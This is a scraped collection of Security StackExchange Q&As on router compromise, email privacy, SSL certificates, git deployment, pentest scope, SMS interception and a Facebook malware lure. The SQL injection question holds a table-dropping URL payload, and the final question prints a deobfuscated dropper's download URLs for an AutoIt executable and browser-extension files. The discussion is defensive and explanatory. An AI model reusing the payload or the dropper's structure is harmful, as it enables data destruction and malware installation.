<p>I came home tomorrow to find that my router password was removed and my network became public. Is there any way anyone could have been able to connect to my router without knowing the password and change it to public?</p>
","<p>From your description, I suppose that your router was configured such that:</p>

<ul>
<li>Using the WiFi entailed knowing the WiFi password, set to the password ""blahblahblahblahblah"".</li>
<li>When contacting the router over IP (whether from the WiFi, or from the outside -- a router, by definition, routes data, so it is connected to at least two networks), it is possible to access the administration interface with the login ""admin"" and the password ""admin"".</li>
</ul>

<p>Then it seems highly probable that the intrusion came from the outside: someone, or some robot, simply connected to your router public IP address (the one facing the outside, allocated by your ISP, not the internal 192.168.0.1), tried to open the administration interface with the default password, and lo! it worked. You would not have been the first one to leave a default password. There is even a <a href=""http://www.shodanhq.com/"" rel=""noreferrer"">database</a> of devices which have been left open. Maybe yours is referenced in there; you might want to have a look.</p>

<p><em>If</em> your router was configured to deny access to the administration interface from the outer network, then the intruder must have come in from the WiFi part. Let's face it, ""blahblahblahblahblah"" is not the strongest password ever -- even if the rest of the WiFi was done properly (i.e. WPA2), such a password would not have lasted long against an attacker with a simple PC.</p>

<p>And, of course, there is always the possibility of a remotely exploitable security hole in the router software. Routers are, internally, small computers with software, which is not often updated (if at all), so they have bugs and holes. A simple search on ""CISCO"" in the published CVE uncovers <a href=""http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=cisco"" rel=""noreferrer"">1418 entries</a>.</p>
","40313"
"Can the recipient of my emails know my IP address?","39224","","<p>When I send out emails using Gmail, is my IP address being recorded? Can the recipient of my Gmail message know my IP address and thus infer where I am located?</p>
","<p>Send yourself an email (at a non-gmail email address) via gmail and read the ""full header"" or ""message source"", especially ""X-Originating-IP"". </p>

<p>Compare this with your own external IP address (google [my ip is]). </p>

<p>The header of an email which I sent from my own gmail address to my own gmail address (""Show Original"") did not contain an originating IP address, or any IP address except a reserved address in the 10.x.x.x range (in other words no IP address that would be identifiable as mine).</p>

<p>Then, I sent an email from my gmail address to myself at another email provider. The header of this email had an X-Originating-IP address which resolves to Google, Inc. It contained several IP addresses, none of which were identifiable as mine.</p>

<p>In appropriate cases a subpoena, search warrant or other lawful process directed to Google, Inc. would, of course, unmask your IP address and reveal your general location (and more legal process would force your ISP to reveal the IP address subscriber's name and address).</p>

<p>Your IP address was recorded by Google when you sent the email, and by God knows what other spooks inhabit the interwebs between you and your ISP, and between your ISP and Google, but it was not sent to your mail recipient(s).</p>
","57580"
"Why is it difficult to catch ""Anonymous"" or ""Lulzsec"" (groups)?","39223","","<p>I'm not security literate, and if I was, I probably wouldn't be asking this question. As a regular tech news follower, I'm really surprised by the <a href=""http://en.wikipedia.org/wiki/Anonymous_%28group%29#Activities"">outrage</a> of <a href=""http://en.wikipedia.org/wiki/Anonymous_%28group%29"">Anonymous (hacker group)</a>, but as a critical thinker, I'm unable to control my curiosity to dig out how exactly they are doing this? Frankly, this group really scares me.</p>

<p>One thing that I don't understand is how they haven't been caught yet. Their IP addresses should be traceable when they DDOS, even if they spoof it or go through a proxy.</p>

<ul>
<li>The server with which they are spoofing should have recorded the IPs of these guys in its logs. If the govt. ask the company (which owns the server) don't they give the logs? </li>
<li>Even if it is a private server owned by these guys, doesn't IANA (or whoever the organization is) have the address &amp; credit card details of the guy who bought &amp; registered the server?</li>
<li>Even if they don't have that, can't the ISPs trace back to the place these packets originated?</li>
</ul>

<p>I know, if it was as simple as I said, the government would have caught them already. So how exactly are they able to escape? </p>

<p>PS: If you feel there are any resources that would enlighten me, I'll be glad to read them.</p>

<p>[Update - this is equally appropriate when referring to the <a href=""http://en.wikipedia.org/wiki/LulzSec"">Lulzsec group</a>, so have added a quick link to the Wikipedia page on them]</p>
","<p>My answer pokes at the original question. What makes you think that they don't get caught?</p>

<p>The CIA and DoD found Osama bin Laden.</p>

<p>Typical means include OSINT, TECHINT, and HUMINT. Forensics can be done on Tor. Secure deletion tools such as sdelete, BCWipe, and DBAN are not perfect. Encryption tools such as GPG and Truecrypt are not perfect.</p>

<p>Online communications was perhaps Osama bin Laden's biggest strength (he had couriers that traveled to far away cyber-cafes using email on USB flash drives) and Anonymous/LulzSec's biggest weakness. They use unencrypted IRC usually. You think they'd at least be using OTR through Tor with an SSL proxy to the IM communications server(s) instead of a cleartext traffic through an exit node.</p>

<p>Their common use of utilities such as Havij and sqlmap could certainly backfire. Perhaps there is a client-side vulnerability in the Python VM. Perhaps there is a client-side buffer overflow in Havij. Perhaps there are backdoors in either.</p>

<p>Because of the political nature of these groups, there will be internal issues. I saw some news lately that 1 in 4 hackers are informants for the FBI.</p>

<p>It's not ""difficult"" to ""catch"" anyone. Another person on these forums suggested that I watch a video from a Defcon presentation where the presenter tracks down a Nigerian scammer using the advanced transform capabilities in Maltego. The OSINT capabilities of Maltego and the i2 Group Analyst's Notebook are fairly limitless. A little hint; a little OPSEC mistake -- and a reversal occurs: the hunter is now being hunted.</p>
","4580"
"What are the risks of self signing a certificate for SSL","39113","","<p>Let's say I sign a SSL certificate for myself, and I'm not using a certified CA. What are the risks and/or threats of doing it?</p>
","<p>The risks are for the client. The point of the SSL server certificate is that it is used by the client to know the server public key, with some level of guarantee that the key indeed belongs to the intended server. The guarantee comes from the CA: the CA is supposed to perform extensive verification of the requester identity before issuing the certificate.</p>

<p>When a client (the user and his Web browser) ""accepts"" a certificate which has not been issued by one of the CA that the client trusts (the CA which were embedded in Windows by Microsoft), then the risk is that the client is currently talking to a fake server, i.e. is under attack. Note that <em>passive</em> attacks (the attacker observes the data but does not alter it in any way) are thwarted by SSL regardless of whether the CA certificate was issued by a mainstream CA or not.</p>

<p>On a general basis, you do not want to train your users to ignore the scary security warning from the browser, because this makes them vulnerable to such server impersonation attacks (which are not that hard to mount, e.g. with <a href=""http://en.wikipedia.org/wiki/DNS_cache_poisoning"">DNS poisoning</a>). On the other hand, if you can confirm, through some other way, that the certificate is genuine <em>that one time</em>, then the browser will remember the certificate and will not show warnings for subsequent visits as long as the same self-signed certificate is used. The newly proposed <a href=""http://convergence.io/"">Convergence</a> PKI is an extension of this principle. Note that this ""remembered certificate"" holds as long as the certificate is unchanged, so you really want to set the expiry date of your self-signed certificate in the far future (but not beyond 2038 if you want to avoid <a href=""http://en.wikipedia.org/wiki/Year_2038_problem"">interoperability issues</a>).</p>

<p>It shall be noted that since a self-signed certificate is not ""managed"" by a CA, there is no possible revocation. If an attacker steals your private key, you <em>permanently</em> lose, whereas CA-issued certificates still have the theoretical safety net of revocation (a way for the CA to declare that a given certificate is rotten). In practice, current Web browser do not check revocation status anyway.</p>
","8112"
"Is using Git for deploying a bad practice?","39076","","<p>I tend to use Git for deploying production code to the web server. That usually means that somewhere a master Git repository is hosted somewhere accessible over <code>ssh</code>, and the production server serves that cloned repository, while restricting access to <code>.git/</code> and <code>.gitignore</code>. When I need to update it, I simply pull to the server's repository from the master repository. This has several advantages:</p>

<ol>
<li>If anything ever goes wrong, it's extremely easy to rollback to an earlier revision - as simple as checking it out.</li>
<li>If any of the source code files are modified, checking it as easy as <code>git status</code>, and if the server's repository has been modified, it will be come obvious the next time I try to pull.</li>
<li>It means there exists one more copy of the source code, in case bad stuff happens.</li>
<li>Updating and rolling back is easy and very fast.</li>
</ol>

<p>This might have a few problems though:</p>

<ul>
<li><p>If for whatever reason web server decides it should serve <code>.git/</code> directory, all the source code there was and is becomes readable for everyone. Historically, there were some (large) companies who made that mistake. I'm using <code>.htaccess</code> file to restrict access, so I don't think there's any danger at the moment. Perhaps an integration test making sure nobody can read the <code>.git/</code> folder is in order?</p></li>
<li><p>Everyone who accidentally gains read access to the folder also gains access to every past revision of the source code that used to exist. But it shouldn't be much worse than having access to the present version. After all, those revisions are obsolete by definition.</p></li>
</ul>

<p>All that said, I believe that using Git for deploying code to production is reasonably safe, and a whole lot easier than <code>rsync</code>, <code>ftp</code>, or just copying it over. What do you think?</p>
","<p>I would go as far as considering using git for deployment <em>very good practice</em>. </p>

<p>The two problems you listed has very little to do with using git for deployment itself. Substitute <code>.git/</code> for the config file containing database passwords and you have the same problem. If I have read access to your web root, I have read access to whatever is contained in it. This is a server hardening issue that you have to discuss with your system administration. </p>

<p>git offers some very attractive advantages when it comes to security.</p>

<ol>
<li><p>You can enforce a system for deploying to production. I would even configure a <code>post-receive</code> hook to automatically deploy to production whenever a commit to <code>master</code> is made. I am assuming of course, a workflow similar to <a href=""http://nvie.com/posts/a-successful-git-branching-model/"">git flow</a>.</p></li>
<li><p>git makes it extremely easy to rollback the code deployed on production to a previous version if a security issue is raised. This can be helpful in blocking access to mission-critical security flaws that you need time to fix properly. </p></li>
<li><p>You can enforce a system where your developers have to sign the commits they make. This can help in tracing who deployed what to production if a deliberate security flaw is  found. </p></li>
</ol>
","45467"
"SQL Injection: Drop All Tables","39016","","<p>I used some vulnerability scanners to check a site of mine, and an instance of blind SQL injection was returned. However, when I try to exploit this vulnerability by entering the following into the address bar, nothing happens:</p>

<pre><code>http://www.example.com/articles.php?id=-1' or 68 = '66; DROP ALL TABLES; --
</code></pre>

<p>I don't see why this isn't working. What is the correct text I must enter into the address bar to drop all the tables (and yes, I am testing this on a backup copy of the site)?</p>
","<p>The <strong>vast majority</strong> of web applications do not allow query stacking. With PHP/MySQL application can allow for query stacking if you use the <code>mysqli::multi_query()</code>or <code>mysqli_multi_query()</code> functions. </p>

<p>You can exploit these systems using sub-select,  union-selects, blind sql injection,  <code>into outfile</code>, or  <code>loadfile()</code>.  SQLMap and Havij are both tools that automate the exploitation of SQL Injection. SQLMap is a great tool with a wide range of features, and supports a wide verity of injections and DBMS'es.</p>
","33905"
"Is it normal for auditors to require all company passwords?","38969","","<p>My company is currently engaged in a security audit framed as a pentest. They've requested all admin passwords for every one of our services and all source code of our software. They want logins for Google Apps, credit card processors, GitHub, DigitalOcean, SSH credentials, database  access, and much more. Note, we've never signed a single NDA (but have been provided a statement of work) and I'm very reluctant to provide this info to them because of this.</p>

<p>Is this normal for a pentest? I assumed it would mostly be black box. How should I proceed?</p>

<p>""UPDATE*  We now have an NDA. The contract does, however, say that we can't hold them liable for anything. Still not sure if this is the right move to continue with them. In my experience, their requests aren't normal even in white box audits, and their statement of work reads in a way that doesn't make it clear if this is a white box or black box audit.</p>
","<blockquote>
  <p>Is this normal for a pentest?</p>
</blockquote>

<p><strong>Absolutely not</strong>.  Best case scenario: they are performing ""social engineering"" penetration testing and want to see if you can be pressured into fulfilling a very dangerous action.  Middle-case scenario, they don't know how to do their job.  Worst-case scenario they are only pretending to be an auditing company and fulfilling their request will result in an expensive breach.</p>

<p>In the case of a code-audit the company will obviously need access to source code.  However I would expect a company who provides such services to already understand the sensitivity of such a need and have <strong>lots</strong> of forms for you to sign, and to offer to work in a strictly controlled environment.  A reputable security company is going to be concerned not just with protecting you (because it is their job) but also with protecting themselves from untrustworthy clients (Our source code got leaked right after we hired you: we're suing!!!!).  All this to say: any reputable security company that doesn't have you sign lots of contracts before going to work is not a reputable security company.</p>

<p>I can't imagine any circumstances in which handing over access to any of those things would be a good idea.</p>

<p><strong>Edit RE: hidden contracts</strong></p>

<p>A few have suggested that the company might have simply not told the OP about any relevant contracts/agreements/NDAs.  I suppose this is possible, but I want to clarify that the lack of a contract isn't the only red flag that I see.</p>

<p>As someone who has built e-commerce sites and business software that has required integration with many CC Processors, I see absolutely no benefit to giving someone else access to your CC Processor.  At that point in time they are no longer penetration testing your systems: they are penetration testing someone else's systems that you happen to use.  Indeed, giving out access credentials in such a way likely violates the terms of service that you signed when you started using your CC Processor (not to mention the other systems they are requesting access to).  So unless you have permission from your CC Processor to hand your credentials to a security auditing company (hint: they would never give you permission), giving them that access is a <strong>huge</strong> liability.</p>

<p>Many others here have done a great job articulating the differences between white-box and black-box testing.  It is certainly true that the more access you give security auditors, the more effectively they can do their jobs.  However, increased access comes with increases costs: both because they charge more for a more thorough vetting, and also increased costs in terms of increased liability and increased trust you have to extend to this company and their employees.  You are talking about freely giving them complete control over <strong>all</strong> of your companies systems.  I can't imagine any circumstances under which I would agree to that.</p>
","172151"
"How hard is it to intercept SMS (two-factor authentication)?","38918","","<p>A lot of two-factor authentication mechanisms use SMS to deliver single-use passphrase to the user. So how secure is it? Is it hard to intercept the SMS message containing the passphrase? Do mobile networks use any kind of encryption on SMS?</p>

<p><strong>UPDATE</strong>
Found interesting article regarding two-factor authentication and the ways it could be attacked:</p>

<p><a href=""http://www.schneier.com/blog/archives/2012/02/the_failure_of_2.html"">http://www.schneier.com/blog/archives/2012/02/the_failure_of_2.html</a></p>
","<p><a href=""http://en.wikipedia.org/wiki/GSM#GSM_service_security"">GSM</a> includes some protection through cryptography. The mobile phone and the provider (i.e. the base station which is part of the provider's network) authenticate each other relatively to a shared secret, which is known to the provider and stored in the user's SIM card. Some algorithms known under the code names ""A3"" and ""A8"" are involved in the authentication. Then the data (as sent through the radio link) is encrypted with an algorithm called ""A5"" and a key derived from A3/A8 and the shared secret.</p>

<p>There are several actual algorithms which hide under the name ""A5"". Which algorithm is used depends on the provider, who, in turn, is constrained by local regulations and what it could license from the GSM consortium. Also, an active attacker (with a fake base station) can potentially force a mobile phone to use another variant, distinct from what it would have used otherwise, and there are not many phones which would alert the user about it (and even fewer users who would care about it).</p>

<ul>
<li><strong>A5/0</strong> means ""no encryption"". Data is sent unencrypted. In some countries, this is the only allowed mode (I think India is such a country).</li>
<li><strong>A5/1</strong> is the old ""strong"" algorithm, used in Europe and North America.</li>
<li><strong>A5/2</strong> is the old ""weak"" algorithm, nominally meant for ""those countries who are good friends but that we do not totally trust nonetheless"" (it is not spelled out that way in the GSM specifications, but that's the idea).</li>
<li><strong>A5/3</strong> is the newer algorithm for GPRS/UMTS.</li>
</ul>

<p>A5/3 is a block cipher also known as <a href=""http://en.wikipedia.org/wiki/KASUMI"">KASUMI</a>. It offers decent security. It has a few shortcomings which would make it ""academically broken"", but none really applicable in practice.</p>

<p>A5/2 is indeed weak, as described in <a href=""http://www.cs.technion.ac.il/users/wwwb/cgi-bin/tr-get.cgi/2006/CS/CS-2006-07.pdf"">this report</a>. The attack requires a fraction of a second, subject to a precomputation which takes less than an hour on a PC and requires a few gigabytes of storage (not much). There are technical details, mostly because the GSM protocol itself is complex, but one can assume that the A5/2 layer is breakable.</p>

<p>A5/1 is stronger, but not very strong. It uses a 64-bit key, but the algorithm structure is weaker and allows for an attack with complexity about <em>2<sup>42.7</sup></em> elementary operations (see <a href=""http://www.bolet.org/~pornin/2000-ches-pornin+stern.pdf"">this article</a> that I wrote 12 years ago). There have been several publications which turn around this complexity, mostly by doing precomputations and waiting for the algorithm internal state to reach a specific structure; although such publications advertise slightly lower complexity figures (around <em>2<sup>40</sup></em>), they have drawbacks which make them difficult to apply, such as requiring thousands of known plaintext bits. With only 64 known plaintext bits, the raw complexity is <em>2<sup>42.7</sup></em>. I have not tried to implement it for a decade, so it is conceivable that a modern PC would run it faster than the workstation I was using at that time; as a rough estimate, a quad core PC with thoroughly optimized code should be able to crack it in one hour.</p>

<p>The size of the internal state of A5/1, and the way A5/1 is applied to encrypt data, also make it vulnerable to time-memory trade-offs, such as <a href=""http://en.wikipedia.org/wiki/Rainbow_table"">rainbow tables</a>. Again, see the Barkan-Biham-Keller article. This assumes that the attacker ran <em>once</em> a truly massive computation, and stored terabytes of data; afterwards, the online phase of the attack can be quite fast. Details very quite a bit, depending on how much storage space you have, how much CPU power is available for the online phase, and how long you are ready to wait for the result. The initial computation phase is huge but technologically doable (a thousand PC ought to be enough); there was an open distributed <a href=""http://reflextor.com/trac/a51"">project for that</a> but I do not know how far they went.</p>

<p><strong>SMS interception</strong> is still a specific scenario. It is not a full voice conversation; the actual amount of exchanged data is small, and the connection is over after a quite short time. This may limit the applicability of the attacks exposed above. Moreover, the attack must be fast: the point of the attack is to grab the secret password sent as a SMS, so that the attacker can use it <em>before</em> the normal user. The attacker must be quick:</p>

<ul>
<li>The server typically applies a short timeout on that password, such as a few minutes. SMS transmission is supposed to be a matter of a few seconds.</li>
<li>The user is not patient (users never are). If he does not get his SMS within five minutes, he will probably request a new one, and a well-thought two-factor authentication system on the server would then invalidate the previous one-time password.</li>
</ul>

<p>Things are easier for the attacker if he already broke the first authentication factor (that's why we use two-factor authentication: because one is not enough). In that case, the attacker may initiate the authentication request while the target user is blissfully unaware of it, and thus unlikely to raise any alarm if he fails to receive a SMS, or, dually, if he receives an unwanted SMS (the attacker may do the attack late at night; the attacked user will find the unwarranted SMS only in the morning, when he wakes up, giving a few hours for the attacker to enact his mischiefs).</p>

<p><strong>GSM encryption is only for the radio link.</strong> In all of the above, we concentrated on an attacker who eavesdrop on data as sent between the mobile phone and the base station. The needed radio equipment appears to be available <a href=""http://www.ndr-resource.com/Solutions.asp?id=3&amp;pid=124"">off-the-shelf</a>, and it is easily conceived that this scenario is applicable in practice. However, the SMS does not travel only from the base station to the mobile phone. Its complete journey begins at the server facilities, then goes through the Internet, and then the provider's network, until it reaches the base station -- and only at that point does it get encrypted with whatever A5 variant is used.</p>

<p>How is data secured within the provider's network, and between the provider and the server which wants the SMS to be sent, is out of scope of the GSM specification. So anything goes. Anyway, if the attacker <em>is</em> the provider, you lose. Law enforcement agencies, when they want to eavesdrop on people, typically do so by asking nicely to the providers, who invariably comply. This is why drug cartels, especially in Mexico and Colombia, tend to build <a href=""http://www.npr.org/2011/12/09/143442365/mexico-busts-drug-cartels-private-phone-networks"">their own cell networks</a>.</p>
","11512"
"What are the security reasons for disallowing the plus sign in email addresses?","38868","","<p>My question is based on <a href=""https://twitter.com/meetup_support/status/499259398603026432"">this tweet</a> after I commented about forbidding <code>+</code> symbols in email addresses. The tweet says, ""This is a measure we've taken for security reasons.""</p>

<p>This can be frustrating and inconvenient for people that have (or use) plus signs in their email address, and I'm sure web sites don't intend to do that. I'm unaware of the security vulnerabilities related to using the <code>+</code> character; is this something I should change to improve my own security? What is the security reason for a web site to disallow that character on an email field?</p>

<p><strong>Update:</strong> Meetup Support responded positively. Turns out it's more of a UX issue than a security one. They clarified <a href=""https://twitter.com/meetup_support/status/499291392649080832"">in this tweet</a> that they disallow <code>+</code> to prevent spam (?) and <a href=""https://twitter.com/meetup_support/status/499295576496668672"">they acknowledged a suggestion</a> for improving the user experience. (My intent here was not to gripe about Meetup; let's be gentle! I wanted to make sure I was not missing something important in my own web sites that receive email addresses.)</p>
","<p>There is no security vulnerability per se with having a '+' in your email address.  It's permitted as per <a href=""http://tools.ietf.org/html/rfc2822#section-3.4.1"">RFC 2822</a>, and not particularly useful for SQL or other common forms of injection.</p>

<p>However, many systems (let's call Meetup a system for this purpose) enforce security through whitelisting, not blacklisting.  Someone defined a limited list of characters they expected to see in email addresses (probably upper, lower, numeric, ., _, and -) and wrote a filter to block anything outside that list.  And they didn't think anyone would use +, so you're out of luck.</p>

<p><a href=""http://stevejenkins.com/blog/2011/03/how-to-use-address-tagging-usertagexample-com-with-postfix/"">This article</a> describes how to set up Postfix to tag, and to use '-' instead of '+' because:</p>

<blockquote>
  <p>However, during a recent discussion on the Postfix user list, it was mentioned that some websites (particularly banks) use JavaScript to try and validate email addresses when they are entered into online forms, and that many don’t allow the plus symbol as a valid character in an email address.</p>
</blockquote>

<p>I switched from '+' to '-' over a decade ago, for similar reasons. </p>
","65249"
"Multiple VPN clients in parallel","38866","","<p>If I were to run more than one VPN clients on my machine, simultaneously, what risks would be involved?  </p>

<p>E.g. are there technical conflicts, such that it wouldn't work right?  </p>

<p>Could there be address resolution conflicts?  </p>

<p>More scary, can traffic from one network cross over, via my machine, into the other network?<br>
Or can my traffic accidentally be misrouted to the wrong network?   </p>

<hr>

<p>If it matters, the VPN clients I'm running are Juniper Network Connect, and Cisco's AnyConnect (On fully patched and hardened Windows7). I don't know much about the remote endpoints...   </p>
","<p>I've used VPN client software on Mac OS X that hijacks the default route to send all traffic through the tunnel (actually, if memory serves me correctly, that was Cisco's). If two such clients were installed, or even one and a sane client, then the answer to the question ""where will this packet go?"" will be timing and implementation dependent. Likely options are that one of the clients will 'win' and will pick up all of the traffic, or that one of the tunnels is implemented via the other. What happens on Windows in such a case is beyond me.</p>

<p>When you talk about ""address resolution"" conflicts, this depends what you mean. If you mean ARP resolution, this shouldn't be a problem. As with any system connected to two networks there ought to be enough uniqueness in MAC addresses to avoid collisions. Regarding DNS resolution, it depends on the specific implementations of the VPN clients and of the client box on the private network. If they behave correctly, then it should be possible to use a DNS server over either private network or the public net (notice the possibility for name collisions on machines in the client's search domains, though). If they misbehave, then again it depends on the specifics of the situation.</p>
","2054"
"Is OpenDNS safe to use?","38760","","<p>Anyone know anything about OpenDNS? Is it safe to use, or should it be avoided? If it should be avoided, what are the alternatives?</p>

<p>I am basically looking for a way to block certain sites from my home network, but at the same time, I don't want to use a service which isn't safe interms of privacy and freedom.</p>
","<p>In my opinion, it's perfectly fine to use, and probably a very good option for a home user. Perhaps you should elaborate on your specific concerns?</p>

<p>I think it's OK because it seems well resourced (due to its business success), and has otherwise signaled ""good"" intentions. By virtue of its size, it is well placed to protect against malicious websites.</p>

<p>From Wikipedia:</p>

<blockquote>
  <p>OpenDNS is a company and service which extends the Domain Name System
  (DNS) by adding features such as misspelling correction, phishing
  protection, and optional content filtering. It provides an
  ad-supported service ""showing relevant ads when we [show] search
  results"" and a paid advertisement-free service.</p>
  
  <p>The company’s Umbrella cloud-delivered security service secures
  enterprise users from malware, botnets and phishing on PCs, laptops,
  and tablets. The OpenDNS Global Network processes ~50 billion DNS
  queries daily from 50 million active users connected to the service
  through 20 data centers worldwide.</p>
</blockquote>

<p>This does mean that you have to trust OpenDNS not to do bad things - because they will see all your DNS requests, they can tell what websites you're visiting. Again, signals of good intent will factor into your decision about whether or not to trust them.</p>

<p>Many other companies offer similar DNS services: Almost <a href=""http://us.norton.com/360/"">any</a> <a href=""http://www.avg.com/gb-en/internet-security"">major</a> <a href=""http://www.kaspersky.co.uk/internet-security?domain=kaspersky.com#Feature0"">antivirus</a> vendor will have it built into their product, plus there are companies targeting businesses with dedicated <a href=""http://www.bluecoat.com/"">appliances</a> that do the same thing.</p>
","53369"
"SSL Certificate framework 101: How does the browser actually verify the validity of a given server certificate?","38710","","<p>Sorry I know this is a complete noob question and at the risk of posting a somewhat duplicate topic. I have a basic understanding of public/private key, hashing, digital signature... I have been searching online &amp; stack forum last couple days but cannot seem to find a satisfatory answer)</p>

<p><strong>Example:</strong> 
I am surfing on open wifi and I browse to  for the 1st time. Server sends back its SSL certificate. My browser does its thing and verifies that the cert is signed by a CA that it trusts and all is well. I click around on the website. BUT!</p>

<p><strong>Question:</strong>
Can someone actually please explain to me in a simple way how does my browser actually verifies that the server certificate is legitimate? Yeah okay so on the cert. itself it says it is issued by, say ""Verisign"" but what is the actual cryptographic magic happens behind the scene to validate that it isn't a bogus certificate? I have heard ppl explained ""SSL certificates are verified using the signing CA's public key"" but that doesn't make sense to me. I thought public key is to encrypt data, not to decrypt data...</p>

<p>So confused... appreciate it if someone could enlighten me...thanks in advance!</p>
","<p>You are correct that SSL uses an asymmetric key pair.  One public and one private key is generated which also known as public key infrastructure (PKI).  The public key is what is distributed to the world, and is used to encrypt the data.  Only the private key can actually decrypt the data though. Here is an example:</p>

<blockquote>
  <p>Say we both go to walmart.com and buy stuff.  Each of us get a copy of
  Walmart's public key to sign our transaction with.  Once the
  transaction is signed by Walmart's public key, only Walmart's private
  key can decrypt the transaction.  If I use my copy of Walmart's public
  key, it will <strong>not</strong> decrypt your transaction.  Walmart must keep
  their private key very private and secure, else anyone who gets it can
  decrypt transactions to Walmart.  This is why the <a href=""https://en.wikipedia.org/wiki/DigiNotar#Issuance_of_fraudulent_certificates"">DigiNotar breach</a> was such a big deal</p>
</blockquote>

<p>Now that you get the idea of the private and public key pairs, it's important to know who actually issues the cert and why certs are trusted.  I'm oversimplifying this, but there are specific root certificate authorities (CA) such as Verisign who sign certs, but also sign for intermediary CA's.  This follows what is called Chain of Trust, which is a chain of systems that trust each other.  See the image linked below to get a better idea (note the root CA is at the bottom).</p>

<p><img src=""https://i.stack.imgur.com/q28Zw.png"" alt=""Simple Chain of Trust""></p>

<p>Organizations often purchase either wildcard certs or get registered as a intermediate CA themselves who is authorized to sign for their domain alone.  This prevents Google from signing certs for Microsoft.</p>

<p>Because of this chain of trust, a certificate can be verified all the way to the root CA.  To show this, DigiCert (and many others) have tools to verify this trust.  DigiCert's tool is linked <a href=""http://www.digicert.com/help/"">here</a>.  I did a validation on gmail.com and when you scroll down it shows this:</p>

<p><img src=""https://i.stack.imgur.com/6FGrc.jpg"" alt=""Certificate of Trust for Gmail""></p>

<p>This shows that the cert for gmail.com is issued by Google Internet Authority G2, who is in turn issued a cert from GeoTrust Global, who is in turn issued a cert from Equifax.</p>

<p>Now when you go to gmail.com, your browser doesn't just get a blob of a hash and goes on it's way.  No, it gets a whole host of details along with the cert:</p>

<p><img src=""https://i.stack.imgur.com/kL7z1.jpg"" alt=""Google Public Cert Details""></p>

<p>These details are what your browser uses to help identify the validity of the cert.  For example, if the expiration date has passed, your browser will throw a cert error.  If all the basic details of the cert check out, it will verify all the way to the root CA, that the cert is valid.</p>

<p>Now that you have a better idea as to the cert details, this expanded image similar to the first one above will hopefully make more sense:</p>

<p><img src=""https://i.stack.imgur.com/gBz21.gif"" alt=""Certificate Chain of Trust Expanded""></p>

<p>This is why your browser can verify one cert against the next, all the way to the root CA, which your browser inherently trusts.</p>

<p>Hope this helps you understand a bit better!</p>
","56393"
"Can my email account be accessed without the password? How secure is it?","38701","","<p>Can my email account be accessed without the password, and how secure is email if I store my personal documents on it?</p>

<p>And how come <a href=""http://en.wikipedia.org/wiki/Yahoo!_Mail"">Yahoo Mail</a> asks me to tell them my friends and folders names to give it back to me after being stolen?</p>
","<ul>
<li>Typically, your email provider (Yahoo, for example) can read everything in your email without knowing your password. </li>
<li>And they will, as required by law and potentially in other circumstances, provide copies to Law Enforcement and Government.</li>
<li>It is also possible that an attacker could compromise Yahoo's servers and access your email that way.</li>
<li>And an attacker might be able to get hold of your password in various ways, in which case the attacker can gain access to your email.  Or, an attacker might be able to guess the answers to your security questions, which also is sufficient for the attacker to gain access to your email account. </li>
<li>Lastly, it's important to mention that emails are not just documents on your email server; they're also on the email server of the person who sent it to you, and maybe cached on your client, and maybe on their client, and backed up in various places, and they travel over the network. Lots of copies mean lots of places where an attacker can get hold of a copy. (Your question hints that you might just be storing documents in email without sending them, in which case this is less of an issue.)</li>
</ul>

<p>Now, all this sounds very scary, but it's important in security to understand the level of risk and what your risk appetite is. Nothing is 100% secure - so you have to ask yourself:
 - How valuable is this data to me? What will it cost me if there is a breach?
 - What kind of attacker might try and get it? What resources and capabilities do they have?</p>

<p>If the data is not very valuable, and anyone who is likely to want it is not very capable, then you don't need a lot of security. </p>

<p>I'm not sure this is very practical, so here's some simple tips will help you improve the security of your stored email:</p>

<ul>
<li>Choose a good password - not in a dictionary, not a name or a date, as long as possible, with a mixture of lowercase, upper case, symbols.</li>
<li>Don't use that same password anywhere else; don't write it down or tell anyone, and use something random that isn't connected to you.</li>
<li>Be careful about your answers to security questions, to make sure that no one will be able to guess them.  If it looks like someone might be able to guess one of the answers to one of your security questions, you could consider lying (pick a random answer that will be unguessable), and write it down somewhere in case you ever need it.</li>
<li>Consider encrypting the documents (with a different password to the one used for your email). There are lots of good tools for this: I like <a href=""http://www.sophos.com/en-us/products/free-tools/sophos-free-encryption.aspx"">http://www.sophos.com/en-us/products/free-tools/sophos-free-encryption.aspx</a>. Don't rely on built-in passwords in Word or WinZip, use a dedicated encryption tool.</li>
</ul>
","14800"
"I was tricked on Facebook into downloading an obfuscated script","38662","","<p>I got a notification on Facebook: ""<em>(a friend of mine)</em> mentioned you in a comment"". However, when I clicked it, Firefox tried to download the following file:</p>

<p><a href=""https://doc-10-50-docs.googleusercontent.com/docs/securesc/ha0ro937gcuc7l7deffksulhg5h7mbp1/n6jgr1l9o9qedfq7aorhbu7bq90o5v3u/1466856000000/01294005275620803036/*/0BynbM0gG6RaBbmJGYmV1WTZXZWM?e=download"">comment_24016875.jse</a></p>

<p>This is an obfuscated script which seems to download an executable (<code>autoit.exe</code>) and run it.</p>

<p>This is the part I managed to deobfuscate:</p>



<pre><code>['Msxml2.XMLhttp', 'onreadystatechange', 'readyState', 'status', 'ADODB.Stream', 'open',
 'type', 'write', 'position', 'read', 'saveToFile', 'close', 'GET', 'send',
 'Scripting.FileSystemObject', 'WScript.Shell', 'Shell.Application', '%APPDATA%\\',
 'ExpandEnvironmentStrings', 'Mozila', 'https://www.google.com',
 'http://userexperiencestatics.net/ext/Autoit.jpg',   '\\autoit.exe',
 'http://userexperiencestatics.net/ext/bg.jpg',       '\\bg.js',
 'http://userexperiencestatics.net/ext/ekl.jpg',      '\\ekl.au3',
 'http://userexperiencestatics.net/ext/ff.jpg',       '\\ff.zip',
 'http://userexperiencestatics.net/ext/force.jpg',    '\\force.au3',
 'http://userexperiencestatics.net/ext/sabit.jpg',    '\\sabit.au3',
 'http://userexperiencestatics.net/ext/manifest.jpg', '\\manifest.json',
 'http://userexperiencestatics.net/ext/run.jpg',      '\\run.bat',
 'http://userexperiencestatics.net/ext/up.jpg',       '\\up.au3',
 'http://whos.amung.us/pingjs/?k=pingjse346',         '\\ping.js',
 'http://whos.amung.us/pingjs/?k=pingjse3462',        '\\ping2.js', '']
</code></pre>

<p>Is this an exploit on Facebook? Is it possible that my friend got a virus which targets their contacts by tagging them on malicious links? Should I report this to Facebook? If so, how?</p>
","<p>This is a typical obfuscated JavaScript malware which targets the Windows Script Host to download the rest of the payload. In this case, it downloads what appears to be mainly a Chrome Extension (<code>manifest.json</code> and <code>bg.js</code>), the autoit Windows executable, and some autoit scripts which install them. All of these files are named with <code>.jpg</code> extensions on the (likely-compromised) server they are hosted, to be less-conspicuous.</p>

